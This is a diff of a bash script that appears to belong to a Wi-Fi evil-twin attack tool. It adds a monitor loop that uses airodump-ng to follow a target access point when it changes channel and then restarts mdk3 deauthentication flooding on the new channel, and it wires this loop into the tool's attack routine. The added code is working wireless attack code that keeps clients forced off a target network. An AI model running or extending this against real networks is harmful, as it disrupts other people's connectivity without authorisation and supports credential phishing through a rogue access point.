@@ -2046,6 +2046,31 @@ function routear {
 
 }
 
+
+
+#> $DUMP_PATH/monitor_channel.sh
+function gen_monitor {
+cat << EOF  >> $DUMP_PATH/monitor_channel.sh
+Host_CHAN=$Host_CHAN
+while true; do
+    rm $DUMP_PATH/redump*  2> /dev/null
+    timeout -s SIGKILL 10 airodump-ng $WIFI_MONITOR --bssid $Host_MAC -w $DUMP_PATH/redump 
+    NCH=\`awk -F", "  '/^'$Host_MAC'/{print \$4}' $DUMP_PATH/redump-01.csv\`
+    NCH=\${NCH##* }
+    NCH=\${NCH#-}
+    [ -z \$NCH ] && NCH=-1
+    echo NCH:\$NCH, Host_CHAN:\$Host_CHAN
+    if [ \$NCH -gt 0 ] && [ \$NCH -lt 15 ] && [ \$NCH -ne \$Host_CHAN ] 2>/dev/null
+    then
+        Host_CHAN=\$NCH
+        killall mdk3 &> $flux_output_device
+        xterm $HOLD $BOTTOMRIGHT -bg '#000000' -fg '#FF0009' -title 'Deauth all [mdk3]  '$Host_SSID -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c \$Host_CHAN &
+    fi
+    sleep 60
+done
+EOF
+}
+
 # Attack
 function attack {
 
@@ -2091,8 +2116,9 @@ function attack {
         killall mdk3 &> $flux_output_device
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
         xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-
         xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
+        gen_monitor
+        xterm  -title "Monitor Channel" -e bash -i $DUMP_PATH/monitor_channel.sh  &
         conditional_clear
 
         while true; do
@@ -2329,6 +2355,7 @@ function matartodo {
         killall lighttpd &>$flux_output_device
         killall dhcpd &>$flux_output_device
         killall xterm &>$flux_output_device
+        #rm $DUMP_PATH/redump*
 
 }
 
